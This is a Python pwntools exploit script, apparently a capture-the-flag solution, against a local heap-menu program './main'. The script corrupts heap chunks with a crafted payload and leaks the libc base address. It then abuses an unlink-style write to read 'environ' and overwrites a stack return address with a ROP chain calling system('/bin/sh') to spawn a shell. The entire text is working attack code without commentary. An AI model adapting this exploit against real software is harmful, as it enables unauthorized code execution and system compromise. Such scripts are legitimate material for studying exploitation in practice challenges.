from pwn import*
def add(size,content,sign):
	p.sendlineafter('>','1')
	p.sendlineafter('size? >',str(size))
	p.sendlineafter('believer? >',sign)
	p.sendafter('sleeve >',content)
def free(index):
	p.sendlineafter('>','2')
	p.sendlineafter('ID? >',str(index))
def edit(index,content):
	p.sendlineafter('> ','3')
	p.sendlineafter('ID? >',str(index))
	p.send(content)
def show(index):
	p.sendlineafter('>','4')
	p.sendlineafter('ID? >',str(index))
	return p.recvuntil("Done")
#context.log_level ='debug'
p = process('./main')
libc = ELF('libc.so',checksec=False)
add(0x60,'\n','N')	#0
add(0x60,'\n','N')	#1
add(0x60,'\n','N')	#2
add(0x60,'\n','N')	#3
add(0x60,'\n','N')	#4
add(0x60,'\n','N')	#5
free(3)
free(5)
free(1)
payload = "\x00"*0x38+p64(0)*3+p64(0x61)+p64(0x20)+p64(0XDEADBEEF)*2+p64(0x70)+p64(0x81)+'H'*8
add(0x38,payload,'Y')
libc_base = u64(show(4)[8:14].ljust(8,'\x00'))-0x292E38
mmap_base = libc_base + 0x290000
heap_base = libc_base + 0x293000
edit(1,p64(1)+p64(0x71)+p64(mmap_base+0x18-0x18)+p64(mmap_base+0x18-0x10)+"\n")
free(4)
edit(1,p64(mmap_base+0x10)+p64(0x4)+p64(0x602034)+p64(8)+p64(libc_base+libc.sym["environ"])+"\n")
edit(1,p32(0))
environ = u64(show(2)[:6].ljust(8,'\x00'))
pop_rdi_ret = 0x14862
binsh = 0x91345
predict_ret = environ-0x90
edit(0,p64(0x70)+p64(predict_ret)+'\n')
edit(1,p64(libc_base+pop_rdi_ret)+p64(libc_base+binsh)+p64(libc_base+libc.sym["system"]))
p.interactive()

	
